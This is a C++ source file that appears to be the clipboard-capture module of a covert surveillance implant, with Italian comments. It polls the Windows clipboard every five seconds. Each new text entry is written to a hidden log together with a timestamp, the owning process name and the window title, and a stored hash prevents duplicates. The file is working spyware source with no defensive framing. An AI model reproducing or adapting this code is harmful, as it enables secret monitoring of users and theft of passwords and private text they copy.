#include "Modules.h"
#include "Common.h"
#include "Module.h"

DWORD WINAPI ClipboardModule(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	HANDLE moduleHandle;

	BOOL bEmpty = TRUE;
	INT iCount;
	UINT uFormat, uMarkupLen, uHash = 0, uNewHash;
	HANDLE hData;
	HWND hWindow;
	BYTE *pBuffer, *pMarkup;
	wstring strText, strOld;
	WCHAR wTitle[MAX_TITLE_LEN];
	Log log;

	me->setStatus(MODULE_RUNNING);
	moduleHandle = me->getEvent();

	if (log.CreateLog(LOGTYPE_CLIPBOARD, NULL, 0, FLASH) == FALSE) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	// Inizializziamo uHash con l'hash dell'ultima stringa presa
	pMarkup = log.ReadMarkup(MODULE_CLIPBOARD, &uMarkupLen);

	if (pMarkup && uMarkupLen == 4)
		CopyMemory(&uHash, pMarkup, sizeof(uHash)); 

	if (pMarkup) {
		delete[] pMarkup;
		pMarkup = NULL;
	}

	DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module is Alive\n", 5, FALSE);

	LOOP {
		do {
			hWindow = GetClipboardOwner();

			// Nessuno ha la clipboard
			if (hWindow == NULL)
				break;

			if (OpenClipboard(hWindow) == FALSE)
				break;

			iCount = CountClipboardFormats();

			if (iCount == 0) {
				CloseClipboard();
				break;
			}

			uFormat = EnumClipboardFormats(0);

			if (uFormat == 0) {
				CloseClipboard();
				break;
			}

			do {
				if (uFormat != CF_UNICODETEXT)
					continue;

				hData = GetClipboardData(CF_UNICODETEXT);
				pBuffer = (BYTE *)GlobalLock(hData);

				if (pBuffer) {
					strText = (WCHAR *)pBuffer;

					// Calcoliamone l'hash
					uNewHash = FnvHash(pBuffer, strText.size() * sizeof(WCHAR));

					GlobalUnlock(hData);

					// Se e' un nuovo dato logghiamolo
					if (uNewHash != uHash && strText != strOld) {
						WCHAR wNull = 0;
						HWND hParent;
						DWORD dwProcId;
						SYSTEMTIME st;
						struct tm mytm;
						wstring strProcName;

						// Scriviamo la data di acquisizione nel log
						GetSystemTime(&st);
						SET_TIMESTAMP(mytm, st);

						if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
							bEmpty = FALSE;

						// Troviamo l'HWND della parent window
						hParent = hWindow;

						while (GetParent(hParent))
							hParent = GetParent(hParent);

						// Scriviamo il nome del processo nel log
						GetWindowThreadProcessId(hParent, &dwProcId);

						if (GetProcessName(dwProcId, strProcName) == FALSE)
							strProcName = L"UNKNOWN";

						log.WriteLog((BYTE *)strProcName.c_str(), strProcName.size() * sizeof(WCHAR));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// Scriviamo il nome della finestra nel log
						if (GetWindowText(hParent, wTitle, MAX_TITLE_LEN) == 0) 
							wcscpy_s(wTitle, MAX_TITLE_LEN, L"UNKNOWN");

						log.WriteLog((BYTE *)&wTitle, (wcslen(wTitle) + 1) * sizeof(WCHAR));

						// Scriviamo i dati della clipboard nel log
						log.WriteLog((BYTE *)strText.c_str(), strText.size() * sizeof(WCHAR));
						log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));

						// Scriviamo il delimiter nel log
						UINT delimiter = LOG_DELIMITER;
						log.WriteLog((BYTE *)&delimiter, sizeof(delimiter));

						// Scriviamo l'hash della stringa attuale nel markup
						uHash = FnvHash((PBYTE)strText.c_str(), strText.size() * sizeof(WCHAR));
						log.WriteMarkup(MODULE_CLIPBOARD, (PBYTE)&uHash, sizeof(uHash));
					}
				}
			} while (uFormat = EnumClipboardFormats(uFormat));

			strOld = strText;

			CloseClipboard();

		} while(0);

		WaitForSingleObject(moduleHandle, 5000);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module is Closing\n", 1, FALSE);

			log.CloseLog(bEmpty);
			me->setStatus(MODULE_STOPPED);
			return 0;
		}

		if (me->shouldCycle()) {
			DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module, log cycling\n", 1, FALSE);

			log.CloseLog(bEmpty);
			log.CreateLog(LOGTYPE_CLIPBOARD, NULL, 0, FLASH);
		}
	}

	return 0;
}